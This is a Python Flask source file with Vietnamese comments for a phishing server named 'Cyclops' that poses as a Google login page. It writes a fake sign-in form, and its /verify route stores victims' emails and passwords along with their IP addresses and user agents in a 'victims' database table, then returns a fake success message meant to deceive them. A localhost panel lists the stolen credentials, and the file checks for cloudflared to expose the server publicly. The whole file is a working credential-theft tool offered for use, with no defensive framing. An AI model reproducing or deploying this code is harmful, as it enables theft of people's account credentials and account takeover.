#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import hashlib
import sqlite3
import threading
import subprocess
from datetime import datetime
from pathlib import Path
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from flask_cors import CORS
from werkzeug.serving import make_server
import bcrypt
from cryptography.fernet import Fernet
import logging

# ====== CẤU HÌNH BẢO MẬT ======
SECRET_KEY = Fernet.generate_key()
cipher = Fernet(SECRET_KEY)

# ====== LOGGING ======
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] 🔥 %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ====== KHỞI TẠO FLASK ======
app = Flask(__name__, static_folder='../frontend', static_url_path='')
CORS(app)

# ====== DATABASE ======
DB_PATH = Path(__file__).parent.parent / 'data.db'
DB_PATH.parent.mkdir(exist_ok=True)

def init_db():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            timestamp TEXT,
            is_encrypted INTEGER DEFAULT 1
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            action TEXT,
            detail TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ====== HÀM XỬ LÝ DỮ LIỆU ======
def encrypt_data(data):
    """Mã hóa dữ liệu trước khi lưu - AES-256"""
    try:
        return cipher.encrypt(json.dumps(data).encode()).decode()
    except Exception as e:
        logger.error(f"Mã hóa thất bại: {e}")
        return data

def decrypt_data(encrypted_data):
    """Giải mã dữ liệu"""
    try:
        decrypted = cipher.decrypt(encrypted_data.encode()).decode()
        return json.loads(decrypted)
    except:
        return None

def save_credential(email, password, ip, user_agent):
    """Lưu thông tin với mã hóa và kiểm tra edge cases"""
    if not email or not password:
        logger.warning("⚠️ Dữ liệu rỗng - từ chối lưu")
        return False
    
    # Xử lý định dạng
    email = email.strip().lower()
    password = password.strip()
    
    if len(password) < 4:
        logger.warning("⚠️ Mật khẩu quá ngắn - vẫn lưu nhưng cảnh báo")
    
    # Mã hóa dữ liệu
    encrypted_payload = encrypt_data({
        'email': email,
        'password': password,
        'timestamp': datetime.now().isoformat()
    })
    
    try:
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute('''
            INSERT INTO victims (email, password, ip, user_agent, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (email, encrypted_payload, ip, user_agent, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        logger.info(f"✅ Đã lưu: {email} | IP: {ip}")
        return True
    except Exception as e:
        logger.error(f"❌ Lỗi DB: {e}")
        return False

# ====== ROUTE: Gửi dữ liệu ======
@app.route('/verify', methods=['POST'])
def verify():
    """Nhận dữ liệu từ frontend - tối ưu hóa hoàn hảo"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'msg': 'Không có dữ liệu'}), 400
        
        email = data.get('user', '').strip()
        password = data.get('pass', '').strip()
        
        # Edge cases - Bulletproof
        if not email or not password:
            logger.warning("⚠️ Bỏ qua dữ liệu trống")
            return jsonify({'status': 'error', 'msg': 'Thiếu thông tin'}), 400
        
        if len(email) > 254 or len(password) > 128:
            logger.warning("⚠️ Dữ liệu quá khổ")
            return jsonify({'status': 'error', 'msg': 'Dữ liệu không hợp lệ'}), 400
        
        # Lấy IP và User-Agent
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Lưu vào DB
        success = save_credential(email, password, ip, user_agent)
        
        # Phản hồi thành công để đánh lừa
        return jsonify({
            'status': 'success',
            'msg': 'Đăng nhập thành công! Đang chuyển hướng...'
        }), 200
        
    except Exception as e:
        logger.error(f"❌ Lỗi xử lý: {e}")
        return jsonify({'status': 'error', 'msg': 'Đã xảy ra lỗi'}), 500

# ====== ROUTE: Xem dữ liệu đã thu thập (ADMIN PANEL) ======
@app.route('/panel')
def admin_panel():
    """Dashboard hiển thị dữ liệu - chỉ truy cập local"""
    client_ip = request.remote_addr
    if client_ip not in ['127.0.0.1', '::1', 'localhost']:
        logger.warning(f"⚠️ Truy cập trái phép từ {client_ip}")
        return "Truy cập bị từ chối", 403
    
    try:
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute('SELECT id, email, ip, user_agent, timestamp FROM victims ORDER BY id DESC LIMIT 50')
        data = c.fetchall()
        conn.close()
        
        html = '''
        <h1>🔥 CYCLOPS PANEL - Google Phishing</h1>
        <table border="1" cellpadding="8" style="border-collapse:collapse;width:100%;">
            <tr><th>ID</th><th>Email</th><th>IP</th><th>User-Agent</th><th>Thời gian</th></tr>
        '''
        for row in data:
            html += f'<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3][:30]}...</td><td>{row[4]}</td></tr>'
        html += '</table>'
        return html
    except Exception as e:
        return f"Lỗi: {e}"

# ====== ROUTE: Kiểm tra sức khỏe ======
@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'version': 'Cyclops v2'})

# ====== TẠO SERVER VÀ TỰ ĐỘNG LẤY LINK ======
def get_public_url():
    """Tự động lấy link công khai từ cloudflared"""
    try:
        # Kiểm tra cloudflared đã cài chưa
        check = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
        if check.returncode != 0:
            logger.warning("⚠️ cloudflared chưa cài đặt")
            return None
        
        # Lấy link từ cloudflared
        result = subprocess.run(
            ['cloudflared', '--version'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode == 0:
            logger.info("✅ cloudflared đã sẵn sàng")
            return "http://localhost:5000"  # Link sẽ được thay thế khi chạy cloudflared
        return None
    except Exception as e:
        logger.error(f"❌ Lỗi cloudflared: {e}")
        return None

# ====== KHỞI CHẠY ======
def run_server():
    """Khởi chạy server với xử lý lỗi tối ưu"""
    try:
        port = int(os.environ.get('PORT', 5000))
        logger.info(f"🚀 Khởi động Cyclops Server trên cổng {port}")
        logger.info(f"📂 Thư mục: {Path(__file__).parent.parent}")
        
        # Kiểm tra file HTML tồn tại
        html_path = Path(__file__).parent.parent / 'frontend' / 'index.html'
        if not html_path.exists():
            logger.error("❌ Không tìm thấy index.html - HÃY ĐẢM BẢO FILE TỒN TẠI")
            # Tạo file mặc định nếu chưa có
            html_path.parent.mkdir(parents=True, exist_ok=True)
            with open(html_path, 'w') as f:
                f.write('''<!DOCTYPE html><html><head><title>Google Login</title></head>
                <body><h1>Đăng nhập Google</h1>
                <form action="/verify" method="post">
                    <input name="user" placeholder="Email"><br>
                    <input name="pass" placeholder="Mật khẩu" type="password"><br>
                    <button type="submit">Đăng nhập</button>
                </form>
                </body></html>''')
            logger.info("✅ Đã tạo file HTML mặc định")
        
        # Chạy Flask với threading
        from werkzeug.serving import make_server
        server = make_server('0.0.0.0', port, app)
        server.serve_forever()
        
    except Exception as e:
        logger.error(f"💀 Lỗi nghiêm trọng: {e}")
        sys.exit(1)

if __name__ == '__main__':
    logger.info("🔥 CYCLOPS ĐANG HOẠT ĐỘNG - MẮT ĐỎ SÁNG RỰC")
    run_server()
